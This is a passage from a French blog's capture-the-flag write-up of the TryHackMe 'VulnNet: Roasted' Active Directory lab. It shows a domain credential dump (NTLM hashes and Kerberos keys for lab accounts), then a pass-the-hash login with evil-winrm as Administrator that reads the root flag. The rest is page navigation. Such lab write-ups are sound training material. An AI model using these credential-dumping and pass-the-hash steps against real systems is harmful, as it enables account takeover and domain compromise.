</span></span><span class="line"><span class="ln">27</span><span class="cl"> <span class="m">0030</span>   7C 8C <span class="m">31</span> <span class="m">96</span> 5E <span class="m">53</span> 5B <span class="m">85</span>  <span class="m">60</span> B4 D5 6B <span class="m">47</span> <span class="m">61</span> <span class="m">85</span> 4A   <span class="p">|</span>.1.^S<span class="o">[</span>.<span class="sb">`</span>..kGa.J
</span></span><span class="line"><span class="ln">28</span><span class="cl">NL<span class="nv">$KM</span>:f3f66b8d1e2af48e85f67a46d125a0d3eaf4907d2dcba58c88c5684c1ed3673bdb31d991c9bb6a57ea182c90d306f8317c8c31965e535b8560b4d56b4761854a
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span class="line"><span class="ln">31</span><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
</span></span><span class="line"><span class="ln">32</span><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class="line"><span class="ln">33</span><span class="cl">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
</span></span><span class="line"><span class="ln">34</span><span class="cl">vulnnet-rst.local<span class="se">\e</span>nterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
</span></span><span class="line"><span class="ln">35</span><span class="cl">vulnnet-rst.local<span class="se">\a</span>-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
</span></span><span class="line"><span class="ln">36</span><span class="cl">vulnnet-rst.local<span class="se">\t</span>-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
</span></span><span class="line"><span class="ln">37</span><span class="cl">vulnnet-rst.local<span class="se">\j</span>-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
</span></span><span class="line"><span class="ln">38</span><span class="cl">vulnnet-rst.local<span class="se">\j</span>-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
</span></span><span class="line"><span class="ln">39</span><span class="cl">WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:b53e5ad16472b47f8fb7292cc3f1f55a:::
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Kerberos keys grabbed
</span></span><span class="line"><span class="ln">41</span><span class="cl">Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
</span></span><span class="line"><span class="ln">42</span><span class="cl">Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
</span></span><span class="line"><span class="ln">43</span><span class="cl">Administrator:des-cbc-md5:52d325cb2acd8fc1
</span></span><span class="line"><span class="ln">44</span><span class="cl">krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
</span></span><span class="line"><span class="ln">45</span><span class="cl">krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
</span></span><span class="line"><span class="ln">46</span><span class="cl">krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
</span></span><span class="line"><span class="ln">47</span><span class="cl">vulnnet-rst.local<span class="se">\e</span>nterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
</span></span><span class="line"><span class="ln">48</span><span class="cl">vulnnet-rst.local<span class="se">\e</span>nterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
</span></span><span class="line"><span class="ln">49</span><span class="cl">vulnnet-rst.local<span class="se">\e</span>nterprise-core-vn:des-cbc-md5:200e0102ce868016
</span></span><span class="line"><span class="ln">50</span><span class="cl">vulnnet-rst.local<span class="se">\a</span>-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
</span></span><span class="line"><span class="ln">51</span><span class="cl">vulnnet-rst.local<span class="se">\a</span>-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
</span></span><span class="line"><span class="ln">52</span><span class="cl">vulnnet-rst.local<span class="se">\a</span>-whitehat:des-cbc-md5:028032c2a8043ddf
</span></span><span class="line"><span class="ln">53</span><span class="cl">vulnnet-rst.local<span class="se">\t</span>-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
</span></span><span class="line"><span class="ln">54</span><span class="cl">vulnnet-rst.local<span class="se">\t</span>-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
</span></span><span class="line"><span class="ln">55</span><span class="cl">vulnnet-rst.local<span class="se">\t</span>-skid:des-cbc-md5:25c2739dcb646bfd
</span></span><span class="line"><span class="ln">56</span><span class="cl">vulnnet-rst.local<span class="se">\j</span>-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
</span></span><span class="line"><span class="ln">57</span><span class="cl">vulnnet-rst.local<span class="se">\j</span>-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
</span></span><span class="line"><span class="ln">58</span><span class="cl">vulnnet-rst.local<span class="se">\j</span>-goldenhand:des-cbc-md5:c4e65d49feb63180
</span></span><span class="line"><span class="ln">59</span><span class="cl">vulnnet-rst.local<span class="se">\j</span>-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
</span></span><span class="line"><span class="ln">60</span><span class="cl">vulnnet-rst.local<span class="se">\j</span>-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
</span></span><span class="line"><span class="ln">61</span><span class="cl">vulnnet-rst.local<span class="se">\j</span>-leet:des-cbc-md5:0815580254a49854
</span></span><span class="line"><span class="ln">62</span><span class="cl">WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:d1cf5bd71959114ef8a147a565ae44490134863025a53ea637e5005ea0f8e2da
</span></span><span class="line"><span class="ln">63</span><span class="cl">WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:475c9d59b8f1d616ccb630e93ae31fc0
</span></span><span class="line"><span class="ln">64</span><span class="cl">WIN-2BO8M1OE1M1$:des-cbc-md5:1f579149bc9252e6
</span></span><span class="line"><span class="ln">65</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
</span></span><span class="line"><span class="ln">66</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stopping service RemoteRegistry
</span></span><span class="line"><span class="ln">67</span><span class="cl"><span class="o">[</span>-<span class="o">]</span> SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
</span></span><span class="line"><span class="ln">68</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
</span></span><span class="line"><span class="ln">69</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stopping service RemoteRegistry
</span></span></code></pre></div><p>Nous avons le hash NT de l&rsquo;administrateur:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
</span></span></code></pre></div>
<h4 id="evil-winrm-1" data-numberify>evil-winrm<a class="anchor ms-1" href="#evil-winrm-1"></a></h4>
<p>On peut maintenant se connecter à la machine avec Evil-WinRM:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">[</span>May 12, <span class="m">2024</span> - 12:32:52 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c1"># evil-winrm -i 10.10.211.33 -u &#39;Administrator&#39; -H &#39;c2597747aa5e43022a3a3049a3c3b09d&#39;</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">Evil-WinRM shell v3.5
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">vulnnet-rst<span class="se">\a</span>dministrator
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; Get-Content <span class="s2">&#34;C:/Users/Administrator/Desktop/system.txt&#34;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">THM<span class="o">{</span>16f45e3934293a57645f8d7bf71d8d4c<span class="o">}</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">exit</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">Info: Exiting with code <span class="m">0</span>
</span></span></code></pre></div><p>On a récupéré le flag root <strong>THM{16f45e3934293a57645f8d7bf71d8d4c}</strong>.</p>
<p>Voilà, c&rsquo;est terminé pour cette room. J&rsquo;espère que vous avez apprécié. Si vous avez des questions ou des suggestions n&rsquo;hésitez pas à me contacter sur <a href="https://www.linkedin.com/in/lukas-taboga-5a8040237/" target="_blank" rel="noopener noreferrer">linkedin<i class="fas fa-external-link-square-alt ms-1"></i></a>.</p></div>
</div>
<div class="modal fade" id="rewardModal" tabindex="-1" aria-labelledby="rewardModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content surface">
      <div class="modal-header">
        <h5 class="modal-title text-surface" id="rewardModalLabel"><i class="fas fa-fw fa-coffee me-1"></i>Buy me a coffee</h5>
        <a href="#" data-bs-dismiss="modal" class="btn-close" aria-label="Close"></a>
      </div>
      <div class="modal-body">
        <ul class="nav nav-tabs mb-3" role="tablist"><li class="nav-item text-nowrap" role="presentation">
            <a class="nav-link active" id="reward-alipay-tab" data-bs-toggle="tab" href="#reward-alipay" role="tab" aria-controls="reward-alipay" aria-selected="true">
              <i class="fab fa-fw fa-alipay me-1"></i>Alipay
            </a>
          </li><li class="nav-item text-nowrap" role="presentation">
            <a class="nav-link" id="reward-wechat-tab" data-bs-toggle="tab" href="#reward-wechat" role="tab" aria-controls="reward-wechat" aria-selected="true">
              <i class="fab fa-fw fa-weixin me-1"></i>WeChat
            </a>
          </li></ul>
        <div class="tab-content" id="rewardTabContent"><div class="tab-pane fade post-reward-content text-center show active" id="reward-alipay" role="tabpanel" aria-labelledby="reward-alipay-tab">
            <img class="img-fluid post-reward-img" src="//localhost:1313/images/reward/alipay.png" loading="lazy" data-viewer-invisible />
          </div><div class="tab-pane fade post-reward-content text-center show" id="reward-wechat" role="tabpanel" aria-labelledby="reward-wechat-tab">
            <img class="img-fluid post-reward-img" src="//localhost:1313/images/reward/wechat.png" loading="lazy" data-viewer-invisible />
          </div></div>
      </div>
    </div>
  </div>
</div></div><div class="card-footer">
  <div class="post-navs d-flex justify-content-evenly"><div class="post-nav post-next">
      <a href="/news/2024/03/juice-shop/">Juice Shop</a>
      <i class="fas fa-fw fa-chevron-down post-next-icon ms-1" data-fa-transform="rotate-270"></i>
    </div></div>
</div></article><div class="post-copyright mb-3 row card component" id="post-copyright">
    <div class="card-header">
        <h2 class="card-title fs-4 my-2 text-surface">Copyright</h2>
    </div>
    <div class="card-body"><a class="d-flex align-items-center flex-column" target="_blank" rel="license noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.en">
  <span><i class="fab fa-fw fa-2x fa-creative-commons"></i><i class="fab fa-fw fa-2x fa-creative-commons-by"></i><i class="fab fa-fw fa-2x fa-creative-commons-nc"></i><i class="fab fa-fw fa-2x fa-creative-commons-nd"></i></span>
  CC BY-NC-ND 4.0 
</a>


    </div>
</div><section class="related-posts row card component">
      <div class="card-header">
        <h2 class="card-title fs-4 my-2 text-surface">
          Related Posts
        </h2>
      </div>
      <div class="card-body slide px-1">
        <div class="slide-inner row gx-0"><div class="col-12 col-md-6 col-lg-4 me-2">
            <div class="post-card card card-body p-0 border-0 surface">
  
  <div
    class="post-card-default-img card-img-top d-flex align-items-center justify-content-center bg-body-secondary mb-1">
    NO IMAGE
  </div>

  <a class="post-title" href="/news/2024/03/headless/">
    Headless
  </a>
  <div class="post-meta mb-0">
    March 26, 2024

  </div>
</div>

          </div><div class="col-12 col-md-6 col-lg-4 me-2">
            <div class="post-card card card-body p-0 border-0 surface">
  
  <div
    class="post-card-default-img card-img-top d-flex align-items-center justify-content-center bg-body-secondary mb-1">
    NO IMAGE
  </div>

  <a class="post-title" href="/news/2024/03/juice-shop/">
    Juice Shop
  </a>
  <div class="post-meta mb-0">
    March 26, 2024

  </div>
</div>

          </div></div>
        <button class="slide-control-left">
          <i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-90"></i>
          <span class="visually-hidden">Left</span>
        </button>
        <button class="slide-control-right">
          <i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-270"></i>
          <span class="visually-hidden">Right</span>
        </button>
      </div>
    </section><div class="card component row post-comments" id="post-comments">
  <div class="card-header">
    <h2 class="card-title my-2 fs-4 text-surface">Comments</h2>
  </div>
  <div class="card-body">
<div class="giscus"></div>



</div>
</div></div>
</div>
<aside class="col-xxl-4 sidebar d-flex">
  <div class="container d-flex flex-column">
    
    
<div class="accordion profile">
  <div class="accordion-item card row text-center component">
    <div class="accordion-header card-header border-0" id="profile-header">
      <a
        class="accordion-button d-lg-none mb-2 shadow-none p-0 bg-transparent text-surface"
        role="button" data-bs-toggle="collapse" href="#profile" aria-expanded="true" aria-controls="profile">
        Profile
      </a>
    </div>
    <div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id="profile" aria-labelledby="profile-header">
      <div class="col-12 d-flex align-items-center justify-content-center"><picture><img class="profile-avatar rounded-circle " alt="Lukas Taboga" src="//localhost:1313/images/image.png?v=8e28e815cea6294f6de693630f6501e6" loading="lazy" data-viewer-invisible width="259" height="194" />
</picture>
</div>
      <div class="col-12 profile-meta"><div class="profile-name fw-fold fs-lg">Lukas Taboga</div><div class="profile-bio">Un blog sur la sécurité, CTF writeups, des recherches et plus encore.</div><div class="profile-location"><i class="fas fa-fw fa-map-marker-alt"></i>Francais</div><a class="profile-about text-primary" href="/about/"><i class="fas fa-fw fa-user"></i>Qui suis-je ?</a><a class="profile-contact text-primary" href="/contact/"><i class="fas fa-fw fa-question-circle"></i>me contacter</a></div>


<nav class="social-links nav justify-content-center mt-1 justify-content-around">
    <a class="nav-link social-link" href="mailto:lukastaboga@gmail.com" title="Email">
      <i class="fas fa-fw fa-2x fa-envelope" style="color: #0963ac;"></i>
    </a>
      <a class="nav-link social-link" target="_blank" href="https://github.com/ticodevv" title="GitHub" rel="me">
        <i class="fa-fw fa-2x fab fa-github"
          ></i>
      </a>
      <a class="nav-link social-link" target="_blank" href="https://www.linkedin.com/in/lukas-taboga-5a8040237/" title="LinkedIn" rel="me">
        <i class="fa-fw fa-2x fab fa-linkedin-in"
           style="color: #0a66c2;"></i>
      </a>
      <a class="nav-link social-link" target="_blank" href="https://twitter.com/razonyang" title="Twitter" rel="me">
        <i class="fa-fw fa-2x fab fa-twitter"
           style="color: #1d9bf0;"></i>
      </a>
</nav>
</div>
  </div>
</div>


<div class="accordion taxonomies-toggle">
    <div class="row card component accordion-item">
        <div class="accordion-header card-header border-0">
            <a
                class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
                role="button" data-bs-toggle="collapse" href="#taxonomies-toggle" aria-expanded="true" aria-controls="taxonomies-toggle">
                Taxonomies
            </a>
        </div>
        <div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id="taxonomies-toggle">
            <ul class="nav nav-pills nav-fill" role="tablist">
                    <li class="nav-item" role="presentation">
                        <button class="nav-link active" id="taxonomySeriesTab" data-bs-toggle="tab" data-bs-target="#taxonomySeries" 
                            type="button" role="tab" aria-controls="taxonomySeries" aria-selected="true">
                            Series
                        </button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="taxonomyCategoriesTab" data-bs-toggle="tab" data-bs-target="#taxonomyCategories" 
                            type="button" role="tab" aria-controls="taxonomyCategories" aria-selected="true">
                            Categories
                        </button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="taxonomyTagsTab" data-bs-toggle="tab" data-bs-target="#taxonomyTags" 
                            type="button" role="tab" aria-controls="taxonomyTags" aria-selected="true">
                            Tags
                        </button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="taxonomyAuthorsTab" data-bs-toggle="tab" data-bs-target="#taxonomyAuthors" 
                            type="button" role="tab" aria-controls="taxonomyAuthors" aria-selected="true">
                            Authors
                        </button>
                    </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="taxonomyArchivesTab" data-bs-toggle="tab" data-bs-target="#taxonomyArchives" 
                        type="button" role="tab" aria-controls="taxonomyArchives" aria-selected="true">
                        Archives
                    </button>
                </li>
            </ul>
            
            <div class="tab-content mt-3">
                    <div class="tab-pane active" id="taxonomySeries" role="tabpanel" aria-labelledby="taxonomySeriesTab" tabindex="0">
                        <a href="/series/news/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-series me-2 mb-2" title="News">
                            News
                            <span class="badge badge-sm text-secondary bg-white ms-1">6</span>
                        </a>
                    </div>
                    <div class="tab-pane" id="taxonomyCategories" role="tabpanel" aria-labelledby="taxonomyCategoriesTab" tabindex="0">
                        <a href="/categories/hardware/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="Hardware">
                            Hardware
                            <span class="badge badge-sm text-secondary bg-white ms-1">3</span>
                        </a>
                        <a href="/categories/writeups/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="Writeups">
                            Writeups
                            <span class="badge badge-sm text-secondary bg-white ms-1">2</span>
                        </a>
                        <a href="/categories/web/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="Web">
                            Web
                            <span class="badge badge-sm text-secondary bg-white ms-1">1</span>
                        </a>
                    </div>
                    <div class="tab-pane" id="taxonomyTags" role="tabpanel" aria-labelledby="taxonomyTagsTab" tabindex="0">
                        <a href="/tags/esp32/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="ESP32">
                            ESP32
                            <span class="badge badge-sm text-secondary bg-white ms-1">2</span>
                        </a>
                        <a href="/tags/web/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Web">
                            Web
                            <span class="badge badge-sm text-secondary bg-white ms-1">2</span>
                        </a>
                        <a href="/tags/active-directory/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Active Directory">
                            Active Directory
                            <span class="badge badge-sm text-secondary bg-white ms-1">1</span>
                        </a>
                        <a href="/tags/arduino/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Arduino">
                            Arduino
                            <span class="badge badge-sm text-secondary bg-white ms-1">1</span>
                        </a>
                        <a href="/tags/as-rep-roasting/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="AS-REP Roasting">
                            AS-REP Roasting
                            <span class="badge badge-sm text-secondary bg-white ms-1">1</span>
                        </a>
                        <a href="/tags/attiny85/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Attiny85">
                            Attiny85
                            <span class="badge badge-sm text-secondary bg-white ms-1">1</span>
                        </a>
                        <a href="/tags/docker/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Docker">
                            Docker
                            <span class="badge badge-sm text-secondary bg-white ms-1">1</span>
                        </a>
                        <a href="/tags/documentation/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Documentation">
                            Documentation
                            <span class="badge badge-sm text-secondary bg-white ms-1">1</span>
                        </a>
                        <a href="/tags/hackthebox/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="HackTheBox">
                            HackTheBox
                            <span class="badge badge-sm text-secondary bg-white ms-1">1</span>
                        </a>
                        <a href="/tags/hardware/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Hardware">
                            Hardware
                            <span class="badge badge-sm text-secondary bg-white ms-1">1</span>
                        </a>
                        <a href="//localhost:1313/tags" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title='ALL'>
                        ALL
                        <span class="badge badge-sm text-secondary bg-white ms-1">18</span>
                        </a>
                    </div>
                    <div class="tab-pane" id="taxonomyAuthors" role="tabpanel" aria-labelledby="taxonomyAuthorsTab" tabindex="0">
                        <a href="/authors/lukas/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-author me-2 mb-2" title="Lukas">
                            Lukas
                            <span class="badge badge-sm text-secondary bg-white ms-1">6</span>
                        </a>
                    </div>
                <div class="tab-pane" id="taxonomyArchives" role="tabpanel" aria-labelledby="taxonomyArchivesTab" tabindex="0">

    <a href="" class="btn btn-sm btn-secondary post-taxonomy ps-3 me-2 mb-2" title="2024">
    2024 <span class="badge badge-sm text-secondary bg-white ms-1">6</span>
    </a>


                </div>
            </div>
        </div>
    </div>
</div>
    <div class="accordion posts-toggle">
      <div class="row card component accordion-item">
        <div class="accordion-header card-header border-0">
          <a
            class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
            role="button"
            data-bs-toggle="collapse"
            href="#posts-toggle"
            aria-expanded="true"
            aria-controls="posts-toggle">
            Posts
          </a>
        </div>
        <div
          class="card-body collapse accordion-collapse accordion-body d-lg-block show"
          id="posts-toggle">
          <ul class="nav nav-pills nav-fill" role="tablist">
              <li class="nav-item" role="presentation">
                <button
                  class="nav-link active"
                  id="featured-posts-tab"
                  data-bs-toggle="tab"
                  data-bs-target="#featured-posts"
                  type="button"
                  role="tab"
                  aria-controls="featured-posts"
                  aria-selected="true">
                  Featured Posts
                </button>
              </li>
              <li class="nav-item" role="presentation">
                <button
                  class="nav-link"
                  id="recent-posts-tab"
                  data-bs-toggle="tab"
                  data-bs-target="#recent-posts"
                  type="button"
                  role="tab"
                  aria-controls="recent-posts"
                  aria-selected="true">
                  Recent Posts
                </button>
              </li>
          </ul>

          <div class="tab-content mt-3">
              <div
                class="tab-pane active"
                id="featured-posts"
                role="tabpanel"
                aria-labelledby="featured-posts-tab"
                tabindex="0">
                <ul class="post-list list-unstyled ms-1">
                    <li class="mb-2">
  <div class="d-flex">
    <div
      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
      <a class="post-title" href="/news/2024/08/m5stack-cardputer/">
        M5stack Cardputer
      </a>
      <div class="post-meta mt-2">
        <span class="post-date">
          August 20, 2024
        </span>
      </div>
    </div>
  </div>
                    </li>
                    <li class="mb-2">
  <div class="d-flex">
    <div
      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
      <a class="post-title" href="/news/2024/08/probe-attack/">
        Probe Attack
      </a>
      <div class="post-meta mt-2">
        <span class="post-date">
          August 20, 2024
        </span>
      </div>
    </div>
  </div>
                    </li>
                    <li class="mb-2">
  <div class="d-flex">
    <div
      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
      <a class="post-title" href="/news/2024/04/rubber-ducky-attiny85/">
        Rubber Ducky (ATtiny85)
      </a>
      <div class="post-meta mt-2">
        <span class="post-date">
          April 1, 2024
        </span>
      </div>
    </div>
  </div>
                    </li>
                    <li class="mb-2">
  <div class="d-flex">
    <div
      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
      <a class="post-title" href="/news/2024/03/headless/">
        Headless
      </a>
      <div class="post-meta mt-2">
        <span class="post-date">
          March 26, 2024
        </span>
      </div>
    </div>
  </div>
                    </li>
                    <li class="mb-2">
  <div class="d-flex">
    <div
      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
      <a class="post-title" href="/news/2024/03/juice-shop/">
        Juice Shop
      </a>
      <div class="post-meta mt-2">
        <span class="post-date">
          March 26, 2024
        </span>
      </div>
    </div>
  </div>
                    </li>
                </ul>
              </div>
              <div
                class="tab-pane"
                id="recent-posts"
                role="tabpanel"
                aria-labelledby="recent-posts-tab"
                tabindex="0">
                <ul class="post-list list-unstyled ms-1">
                    <li class="mb-2">
  <div class="d-flex">
    <div
      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
      <a class="post-title" href="/news/2024/08/probe-attack/">
        Probe Attack
      </a>
      <div class="post-meta mt-2">
        <span class="post-date">
          August 20, 2024
        </span>
      </div>
    </div>
  </div>
                    </li>
                    <li class="mb-2">
  <div class="d-flex">
    <div
      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
      <a class="post-title" href="/news/2024/08/m5stack-cardputer/">
        M5stack Cardputer
      </a>
      <div class="post-meta mt-2">
        <span class="post-date">
          August 20, 2024
        </span>
      </div>
    </div>
  </div>
                    </li>
                    <li class="mb-2">
  <div class="d-flex">
    <div
      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
      <a class="post-title" href="/news/2024/04/rubber-ducky-attiny85/">
        Rubber Ducky (ATtiny85)
      </a>
      <div class="post-meta mt-2">
        <span class="post-date">
          April 1, 2024
        </span>
      </div>
    </div>
  </div>
                    </li>
                    <li class="mb-2">
  <div class="d-flex">
    <div
      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
      <a class="post-title" href="/news/2024/03/vulnnet-roasted/">
        VulnNet Roasted
      </a>
      <div class="post-meta mt-2">
        <span class="post-date">
          March 26, 2024
        </span>
      </div>
    </div>
  </div>
                    </li>
                    <li class="mb-2">
  <div class="d-flex">
    <div
      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
      <a class="post-title" href="/news/2024/03/juice-shop/">
        Juice Shop
      </a>
      <div class="post-meta mt-2">
        <span class="post-date">
          March 26, 2024
        </span>
      </div>
    </div>
  </div>
                    </li>
                </ul>
              </div>
          </div>
        </div>
      </div>
    </div>
<div class="accordion post-toc d-none d-lg-block">
  <div class="accordion-item row mb-4 card component" id="postTOC">
    <div class="card-header accordion-header">
      <h2 class="card-title fs-4 my-2 text-surface d-none d-lg-block">Contents</h2>
      <a class="accordion-button d-lg-none mb-1 collapsed shadow-none p-0 bg-transparent" role="button" data-bs-toggle="collapse" href="#post-toc" aria-expanded="false" aria-controls="post-toc">
        Contents
      </a>
    </div>
    <div class="card-body collapse accordion-collapse accordion-body d-lg-block" id="post-toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#vulnnet-roasted">VulnNet Roasted</a>
      <ul>
        <li><a href="#reconnaissance">Reconnaissance</a></li>
        <li><a href="#exploitation">Exploitation</a></li>
        <li><a href="#escalade-de-privilèges">Escalade de privilèges</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
  </div>
</div>





    
  </div>
</aside>

      </div>
    </main><footer class="footer mt-auto py-3 text-center container"><div class="offcanvas offcanvas-bottom h-auto" tabindex="-1" id="offcanvasActionsPanel"
  aria-labelledby="offcanvasActionsPanelLabel">
  <div class="offcanvas-header">
    <div class="offcanvas-title h5" id="offcanvasActionsPanelLabel">
      <i class="fas fa-fw fa-th-large me-1"></i>
      Actions
    </div>
    <button type="button" class="btn-close ms-auto" data-bs-dismiss="offcanvas" data-bs-target="offcanvasActionsPanel" aria-label="Close"></button>
  </div>
  <div class="offcanvas-body mt-2"><div class="social-share mb-4 d-flex overflow-auto">
      <a class="btn-social-share d-flex flex-column align-items-center me-3" rel="noopener noreferrer" aria-label="Twitter Share Button"
      target="_blank" href="https://twitter.com/intent/tweet?title=404%20Page%20not%20found&url=%2f%2flocalhost%3a1313%2f404.html">
        <i class="fab fa-2x fa-fw fa-twitter mb-2"></i> Twitter
      </a>
      <a class="btn-social-share d-flex flex-column align-items-center me-3" rel="noopener noreferrer" aria-label="Facebook Share Button"
        target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=%2f%2flocalhost%3a1313%2f404.html">
        <i class="fab fa-2x fa-fw fa-facebook-f mb-2"></i> Facebook
      </a>
    </div>
    <hr class="mb-4"><div class="actions d-flex overflow-auto align-items-center">
      <a role="button" class="action action-go-back d-flex flex-column align-items-center me-3" href="javascript: window.history.back();">
        <span class="action-icon mb-2"><i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-90"></i></span> Go back
      </a>
      <a role="button" class="action action-reload-page d-flex flex-column align-items-center me-3">
        <span class="action-icon mb-2"><i class="fas fa-2x fa-redo-alt"></i></span> Reload
      </a>
      <a role="button" class="action action-copy-url d-flex flex-column align-items-center me-3">
